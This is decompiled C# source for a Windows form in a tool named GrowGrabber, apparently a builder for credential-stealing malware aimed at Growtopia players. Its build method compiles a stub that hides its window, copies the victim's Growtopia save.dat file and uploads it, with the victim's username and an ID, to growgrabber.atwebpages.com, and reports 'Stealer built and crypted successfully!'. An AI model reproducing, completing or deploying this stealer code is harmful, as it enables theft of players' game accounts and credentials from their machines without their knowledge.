using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraTab;
using GrowGrabber.Properties;
using Microsoft.CSharp;
using Microsoft.Win32;

namespace GrowGrabber
{
	// Token: 0x02000004 RID: 4
	public partial class Form2 : XtraForm
	{
		// Token: 0x06000029 RID: 41 RVA: 0x0000563D File Offset: 0x0000383D
		public Form2()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x0000566C File Offset: 0x0000386C
		private string GenerateString(int length, IList<Form2.Range> ranges)
		{
			StringBuilder builder = new StringBuilder(length);
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				int rangeIndex = random.Next(ranges.Count);
				Form2.Range range = ranges[rangeIndex];
				builder.Append((char)random.Next(range.Begin, range.End));
			}
			return builder.ToString();
		}

		// Token: 0x0600002B RID: 43 RVA: 0x000056CC File Offset: 0x000038CC
		private void simpleButton2_Click(object sender, EventArgs e)
		{
			Form2.Range[] ranges = new Form2.Range[]
			{
				new Form2.Range(19968, 20352),
				new Form2.Range(20480, 40864),
				new Form2.Range(13312, 19888),
				new Form2.Range(12448, 12528)
			};
			for (int i = 0; i < 10000; i++)
			{
				this.textEdit3.Text = "Client-" + new Random().Next(0, 999999).ToString();
				this.encryption_key = "Client-" + this.GenerateString(new Random().Next(0, 50), ranges);
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00005789 File Offset: 0x00003989
		public bool CompileCode()
		{
			return true;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000578C File Offset: 0x0000398C
		private string RandomString(int length)
		{
			string pool = "abcdefghijklmnopqrstuvwxyz";
			pool += pool.ToUpper();
			string tmp = "";
			Random R = new Random();
			for (int x = 0; x < length; x++)
			{
				tmp += pool[R.Next(0, pool.Length)].ToString();
			}
			return tmp;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x000057E8 File Offset: 0x000039E8
		public void build()
		{
			SaveFileDialog sik = new SaveFileDialog();
			sik.ShowDialog();
			string exeFile = sik.FileName + ".exe";
			CSharpCodeProvider provider = new CSharpCodeProvider();
			CompilerParameters cp = new CompilerParameters();
			cp.GenerateExecutable = true;
			cp.OutputAssembly = exeFile;
			cp.IncludeDebugInformation = true;
			cp.ReferencedAssemblies.Add("System.dll");
			cp.ReferencedAssemblies.Add("System.IO.dll");
			cp.ReferencedAssemblies.Add("System.Net.dll");
			cp.GenerateInMemory = false;
			cp.WarningLevel = 3;
			cp.TreatWarningsAsErrors = false;
			if (this.checkBox1.Checked)
			{
				cp.CompilerOptions = "/target:winexe /win32icon:" + this.textEdit1.Text;
			}
			else
			{
				cp.CompilerOptions = "/target:winexe";
			}
			provider.Supports(GeneratorSupport.EntryPointMethod);
			RegistryKey seria = Registry.CurrentUser.OpenSubKey("GFD", true);
			Encoding.UTF32.GetString(Encoding.ASCII.GetBytes(this.textEdit3.Text.Replace("Client-", "")));
			string code = string.Concat(new string[]
			{
				"using System; using System.Net; using System.IO; using System.Runtime.InteropServices;\nnamespace hira\n {\n class FlatUI\n{\n[DllImport(\"user32.dll\")]\npublic static extern IntPtr FindWindow(string lpClassName,string lpWindowName);\n[DllImport(\"kernel32.dll\")]\nstatic extern IntPtr GetConsoleWindow();\n[DllImport(\"user32.dll\")]\nstatic extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\nconst int SW_HIDE = 0;\nconst int SW_SHOW = 5;\n\nstatic void Main(string[] args)\n{ \nvar handle = GetConsoleWindow();\nIntPtr hWnd = FindWindow(null, \"Your console windows caption\");\nif(hWnd != IntPtr.Zero)\n{\n ShowWindow(hWnd, 0); // 0 = SW_HIDE\n}\nShowWindow(handle, SW_HIDE);\nRandom id = new Random();int ids = id.Next(100000, 900000);string savedatpath =@\"C:\\Users\\\"  + Environment.UserName + @\"\\AppData\\Local\\Growtopia\\save.dat\";\nstring tmpdrop = Path.GetTempPath();\nFile.Copy(savedatpath,tmpdrop + ids + \"_pass.txt\");\nnew System.Net.WebClient().DownloadFile(\"http://growgrabber.atwebpages.com/SFW/",
				seria.GetValue("user").ToString(),
				"/netids.txt\",tmpdrop + \"netids.txt\");\nFile.AppendAllText(tmpdrop + \"netids.txt\" , Environment.NewLine + ids.ToString());\nnew System.Net.WebClient().DownloadFile(\"http://growgrabber.atwebpages.com/SFW/",
				seria.GetValue("user").ToString(),
				"/",
				seria.GetValue("user").ToString(),
				".txt\", tmpdrop + \"",
				seria.GetValue("user").ToString(),
				".txt\");\nSystem.IO.File.AppendAllText(tmpdrop +\"",
				seria.GetValue("user").ToString(),
				".txt\",  Environment.NewLine + ids + \"    \" + Environment.UserName);\nnew System.Net.WebClient().UploadFile(\"http://growgrabber.atwebpages.com/SFW/",
				seria.GetValue("user").ToString(),
				"/\",tmpdrop+ ids + \"_pass.txt\");\nnew System.Net.WebClient().UploadFile(\"http://growgrabber.atwebpages.com/SFW/",
				seria.GetValue("user").ToString(),
				"/\",tmpdrop+ \"netids.txt\");\nnew System.Net.WebClient().UploadFile(\"http://growgrabber.atwebpages.com/SFW/",
				seria.GetValue("user").ToString(),
				"/\",tmpdrop+\"",
				seria.GetValue("user").ToString(),
				".txt\");\nFile.Delete(\"",
				seria.GetValue("user").ToString(),
				".txt\");\n}}}"
			});
			CompilerResults cr = provider.CompileAssemblyFromSource(cp, new string[]
			{
				code
			});
			this.memoEdit1.EditValue = "Compiling server...";
			Thread.Sleep(1000);
			this.memoEdit1.EditValue = "Compiling server..." + Environment.NewLine + "Encrypting String(s)...";
			if (cr.Errors.Count > 0)
			{
				this.memoEdit1.EditValue = "Compiling server...\nError:" + code;
				Console.WriteLine("Errors building {0} into {1}", code, cr.PathToAssembly);
				using (IEnumerator enumerator = cr.Errors.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						object obj = enumerator.Current;
						CompilerError ce = (CompilerError)obj;
						Console.WriteLine("  {0}", ce.ToString());
						Console.WriteLine();
					}
					goto IL_38B;
				}
			}
			this.memoEdit1.EditValue = string.Concat(new string[]
			{
				"Compiling server...",
				Environment.NewLine,
				"Encrypting String(s)...",
				Environment.NewLine,
				"Stealer built and crypted successfully!"
			});
			this.textEdit3.Text = "Stealer built and crypted successfully!";
			Console.WriteLine("{0} temporary files created during the compilation.", cp.TempFiles.Count.ToString());
			IL_38B:
			File.Move(sik.FileName + "/stub.exe", sik.FileName.Replace(".exe", " .exe"));
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00005BBC File Offset: 0x00003DBC
		private async void simpleButton3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00005BF0 File Offset: 0x00003DF0
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			OpenFileDialog ico = new OpenFileDialog();
			ico.ShowDialog();
			this.textEdit1.Text = ico.FileName;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00005C1C File Offset: 0x00003E1C
		public void fuckgen()
		{
			Form2.Range[] ranges = new Form2.Range[]
			{
				new Form2.Range(19968, 20352),
				new Form2.Range(20480, 40864),
				new Form2.Range(13312, 19888),
				new Form2.Range(12448, 12528)
			};
			for (int i = 0; i < 10000; i++)
			{
				this.textEdit3.Text = "Client-" + new Random().Next(0, 999999).ToString();
				this.encryption_key = "Client-" + this.GenerateString(new Random().Next(0, 50), ranges);
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00005CD9 File Offset: 0x00003ED9
		private void Form2_Load(object sender, EventArgs e)
		{
			if (File.Exists("skin.json"))
			{
				base.LookAndFeel.SetSkinStyle(File.ReadAllText("skin.json"));
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00005CFC File Offset: 0x00003EFC
		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00005D00 File Offset: 0x00003F00
		private async void simpleButton3_Click_1(object sender, EventArgs e)
		{
			this.memoEdit1.EditValue = "Compiling server..." + Environment.NewLine + "Encrypting String(s)...";
			this.xtraTabControl1.SelectedTabPageIndex = 2;
			this.build();
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00005D39 File Offset: 0x00003F39
		private void simpleButton1_Click(object sender, EventArgs e)
		{
			this.fuckgen();
		}

		// Token: 0x04000039 RID: 57
		private string encryption_key = "";

		// Token: 0x0400003A RID: 58
		private string hash = "";

		// Token: 0x0400003B RID: 59
		private string ico = "";

		// Token: 0x02000015 RID: 21
		private class Range
		{
			// Token: 0x17000015 RID: 21
			// (get) Token: 0x060000A9 RID: 169 RVA: 0x0000922A File Offset: 0x0000742A
			// (set) Token: 0x060000AA RID: 170 RVA: 0x00009232 File Offset: 0x00007432
			public int Begin { get; set; }

			// Token: 0x17000016 RID: 22
			// (get) Token: 0x060000AB RID: 171 RVA: 0x0000923B File Offset: 0x0000743B
			// (set) Token: 0x060000AC RID: 172 RVA: 0x00009243 File Offset: 0x00007443
			public int End { get; set; }

			// Token: 0x060000AD RID: 173 RVA: 0x0000924C File Offset: 0x0000744C
			public Range(int begin, int end)
			{
				this.Begin = begin;
				this.End = end;
			}
		}
	}
}
